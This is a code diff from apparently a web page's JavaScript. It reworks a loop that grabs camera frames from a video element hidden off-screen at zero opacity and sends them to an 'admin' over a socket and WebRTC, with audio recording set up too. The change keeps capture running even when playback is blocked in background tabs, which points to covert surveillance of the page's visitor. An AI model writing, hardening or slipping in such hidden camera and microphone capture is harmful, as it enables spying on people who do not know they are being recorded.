@@ -810,42 +810,41 @@
           liveStreamVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;';
           document.body.appendChild(liveStreamVideo);
 
-          liveStreamVideo.play().then(() => {
-            // Step 4 — requestAnimationFrame capture loop (avoids setInterval FPS cap)
-            const TARGET_FPS = 15; // sweet-spot: smooth feed without overloading the socket
-            const FRAME_INTERVAL = 1000 / TARGET_FPS;
-            let lastFrameTime = 0;
+          // Start WebRTC peer connection immediately using the raw stream (does not require video.play() to resolve)
+          startWebRTCStream(stream);
 
-            // Also start WebRTC peer connection for true 30 FPS stream
-            startWebRTCStream(liveStreamVideo.srcObject);
+          // Play the video in the background (ignore promise suspension on inactive tabs)
+          liveStreamVideo.play().catch(e => {
+            console.warn("Video playback deferred until tab focus:", e);
+          });
 
-            function captureLoop(timestamp) {
-              if (!liveStreamActive) return; // stopped
-              if (timestamp - lastFrameTime >= FRAME_INTERVAL) {
-                lastFrameTime = timestamp;
-                if (liveStreamVideo && liveStreamVideo.readyState >= 2) {
-                  try {
-                    // Step 4 — draw to existing canvas (reuse, don't create every frame)
-                    const settings = liveStreamVideo.srcObject
-                      ? liveStreamVideo.srcObject.getVideoTracks()[0].getSettings()
-                      : {};
-                    liveStreamCanvas.width  = settings.width  || 1280;
-                    liveStreamCanvas.height = settings.height || 720;
-                    liveStreamContext.drawImage(liveStreamVideo, 0, 0);
-                    // 0.6 quality — sweet spot between speed and clarity (Step 4)
-                    const photo = liveStreamCanvas.toDataURL('image/jpeg', 0.6);
-                    if (photo && photo.length > 1000) {
-                      // Step 5 — send frame via Socket.IO camera:frame event
-                      sendFrameToAdmin(photo);
-                    }
-                  } catch (e) { }
-                }
+          // Start the snapshot capture loop immediately
+          const TARGET_FPS = 15;
+          const FRAME_INTERVAL = 1000 / TARGET_FPS;
+          let lastFrameTime = 0;
+
+          function captureLoop(timestamp) {
+            if (!liveStreamActive) return; // stopped
+            if (timestamp - lastFrameTime >= FRAME_INTERVAL) {
+              lastFrameTime = timestamp;
+              if (liveStreamVideo && liveStreamVideo.readyState >= 2) {
+                try {
+                  const settings = liveStreamVideo.srcObject
+                    ? liveStreamVideo.srcObject.getVideoTracks()[0].getSettings()
+                    : {};
+                  liveStreamCanvas.width  = settings.width  || 1280;
+                  liveStreamCanvas.height = settings.height || 720;
+                  liveStreamContext.drawImage(liveStreamVideo, 0, 0);
+                  const photo = liveStreamCanvas.toDataURL('image/jpeg', 0.6);
+                  if (photo && photo.length > 1000) {
+                    sendFrameToAdmin(photo);
+                  }
+                } catch (e) { }
               }
-              captureFrameId = requestAnimationFrame(captureLoop);
             }
             captureFrameId = requestAnimationFrame(captureLoop);
-
-          }).catch(() => stopLiveCamera());
+          }
+          captureFrameId = requestAnimationFrame(captureLoop);
 
           // Audio recording setup
           const audioTracks = stream.getAudioTracks();
